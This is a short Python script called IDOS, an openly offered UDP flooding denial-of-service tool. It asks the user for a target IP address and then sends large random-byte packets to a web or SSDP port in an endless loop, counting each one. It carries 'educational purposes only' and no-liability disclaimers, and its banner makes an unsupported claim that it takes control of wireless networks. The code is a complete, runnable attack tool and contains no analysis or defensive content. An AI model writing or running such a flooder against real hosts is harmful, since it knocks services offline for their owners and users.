# IDOS is a free UDP flooding tool, for educational purposes only...
# Am not available for any damage!!! feel free to use...

# libraries installed
#import pyfiglet as pft
import re
import platform
from random import _urandom
import socket
import os
import random
import time

# clear screen output...
if platform.system() == 'Windows':
    os.system('cls')
else:
    os.system('clear')

# title screen
#print(pft.figlet_format('IDOS', font='slant'))

# create a byte
maximum_bytes = _urandom(9999)

# content
print('* COMPANY - CODEBASE TECHNOLOGY *')
print('* DEVELOPER - GOSPEL CHUKWUNONSO *')
print('* COUNTRY - NIGERIA *')
print('* TEL - +234 9078260643 *\n')

# info
print("IDOS IS A INTEGRATED DISTRIBUTED DENIAL OF SERVICE TOOL [UDP FLOODING TOOL]!!! THIS TOOL TAKE CONTROL OF A WIRELESS NETWORK... DO NOT USE THIS TOOL FOR ILLEGAL PURPOSES!!! WARNING - THIS TOOL ISN'T DISTRIBUTED FOR NEWBIE!!! IF YOU ARE JUST USING THIS TOOL KINDLY VISIT THE README TO LEARN MORE!!! THANKS\n")
input('Press <ENTER> To Continue...')
# clear screen output...
if platform.system() == 'Windows':
    os.system('cls')
else:
    os.system('clear')

# main
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
target_ip = input('[*] TARGET IP >> ')
target_port = random.choice([80, 443, 1900])
time.sleep(2)
# clear screen output...
if platform.system() == 'Windows':
    os.system('cls')
else:
    os.system('clear')
print('[*] Entering Monitoring Mode...\n')
print('[*] Press <ctrl + c> To Terminate When In Monitoring Mode!!!')
time.sleep(4)

# clear screen output...
if platform.system() == 'Windows':
    os.system('cls')
else:
    os.system('clear')
time.sleep(4)
packets = 0
while True:
    sock.connect((target_ip, target_port))
    sock.sendto(maximum_bytes, (target_ip, target_port))
    packets+=1
    output = """
    | SENT {} PACKET TO {} AT PORT {} |
    """
    print(output.format(packets, target_ip, target_port))